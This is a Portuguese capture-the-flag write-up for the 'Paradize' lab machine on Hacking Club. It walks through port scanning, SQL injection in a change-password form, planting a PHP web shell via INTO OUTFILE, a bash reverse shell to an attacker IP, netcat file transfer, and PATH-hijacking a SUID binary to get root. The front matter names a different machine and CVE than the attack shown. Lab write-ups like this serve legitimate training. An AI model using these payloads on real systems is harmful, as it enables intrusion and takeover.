@@ -1,0 +1,163 @@
+---
+title: 'Paradize Writeup'
+date: '2024-11-30'
+tags: ['CVE-2022-36231', 'Command Injection', 'Linux']
+draft: false
+summary: 'A máquina Injection é vulnerável a Command Injection (CVE-2022-36231) e escalonamento de privilégios via sudo.'
+images: ['/static/images/paradize-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/paradize-writeup-images/default.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Easy
+
+### **Nome**: Paradize
+
+---
+
+## **Port Scanning**
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```bash
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 2e:46:3f:4e:29:18:65:c6:83:44:02:99:72:92:cc:84 (ECDSA)
+|_  256 60:fc:6f:94:db:f1:72:13:7b:9f:51:4f:88:5c:1e:93 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://paradize.hc
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Somente as portas 22 (SSH) e 80 (HTTP) estão abertas.
+
+---
+
+## **Enumeration**
+
+`http://172.16.7.123`
+
+![paradize](/static/images/paradize-writeup-images/image.png)
+
+`sudo vim /etc/hosts`
+
+![paradize 1](/static/images/paradize-writeup-images/image1.png)
+
+Acessando a aplicação
+
+`http://paradize.hc`
+
+![paradize 2](/static/images/paradize-writeup-images/image2.png)
+
+Registrando um novo usuário
+
+![paradize 3](/static/images/paradize-writeup-images/image3.png)
+
+Aparentemente o campo de login/register não são vulneráveis a SQL Injection (Aspas simples não funcionou).
+
+Após logarmos, temos uma funcionalidade de ‘Change Passord’.
+
+![paradize 4](/static/images/paradize-writeup-images/image4.png)
+
+Ao passar uma aspas simples, a aplicação retorna um erro do banco de dados, indicando um possível SQL Injection
+
+![paradize 5](/static/images/paradize-writeup-images/image5.png)
+
+![paradize 6](/static/images/paradize-writeup-images/image6.png)
+
+Capturei a requisição no Burp para facilitar a exploração.
+
+O próximo passo é explorar o SQL Injection, começamos enumerando o numero de colunas presente no banco de dados.
+
+`' UNION SELECT 1 #`
+
+![paradize 7](/static/images/paradize-writeup-images/image7.png)
+
+Existem 3 colunas nesse banco de dados, pois a aplicação não exibiu um erro.
+
+`' UNION SELECT 1,2,3 #`
+
+![paradize 8](/static/images/paradize-writeup-images/image8.png)
+
+O próximo passo é utilizar o SQL Injection pra injetar uma web-shell em um arquivo com a função `into outfile` do MySQL.
+
+Para identificar um diretório com permissões de escrita, podemos utilizar o modo `recursion` do `ffuf`
+
+### Fuzzing
+
+`ffuf -u http://paradize.hc/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -recursion`
+
+![paradize 9](/static/images/paradize-writeup-images/image9.png)
+
+`'union select 1,"<?php system($_GET['cmd']); ?>",3 into outfile "/var/www/html/public/images/uploads/shell.php"-- -`
+
+![paradize 10](/static/images/paradize-writeup-images/image10.png)
+
+![paradize 11](/static/images/paradize-writeup-images/image11.png)
+
+---
+
+## FootHold
+
+`bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'`
+
+OBS: Lembre de encodar a payload.
+
+![paradize 12](/static/images/paradize-writeup-images/image12.png)
+
+`nc -lnvp 1337`
+
+![paradize 13](/static/images/paradize-writeup-images/image13.png)
+
+---
+
+## Privillege Escalation
+
+`find / -perm -u=s 2>/dev/null`
+
+![paradize 14](/static/images/paradize-writeup-images/image14.png)
+
+Executando o binário pra ver o que ele faz
+
+![paradize 15](/static/images/paradize-writeup-images/image15.png)
+
+Transferindo ele pra nossa maquina, para analisar melhor
+
+```jsx
+#kali
+nc -lnvp 8000 >enrollment
+#alvo
+nc 10.0.31.150 8000 < /usr/sbin/enrollment
+```
+
+![paradize 16](/static/images/paradize-writeup-images/image16.png)
+
+Analisando o binário no **Ghidra** , podemos ver que ele chama o comando `system` pra executar o programa `figlet` .
+
+![paradize 17](/static/images/paradize-writeup-images/image17.png)
+
+No Linux, os arquivos são executados em uma ordem especifica, sabendo disso podemos criar um arquivo chamado `figlet` malicioso que se será executado antes pelo binário `enrollment` utilizando a técnica de **Path Hijacking**.
+
+```bash
+www-data@ip-172-16-7-123:/tmp$ echo '#!/bin/bash' > figlet
+www-data@ip-172-16-7-123:/tmp$ echo 'chmod u+s /bin/bash' >> figlet
+www-data@ip-172-16-7-123:/tmp$ chmod 777 figlet
+www-data@ip-172-16-7-123:/tmp$ export PATH=$(pwd):$PATH
+www-data@ip-172-16-7-123:/tmp$ /usr/sbin/enrollment
+
+```
+
+![paradize 18](/static/images/paradize-writeup-images/image18.png)
+
+---
+
+## Proof
+
+![paradize 19](/static/images/paradize-writeup-images/image19.png)
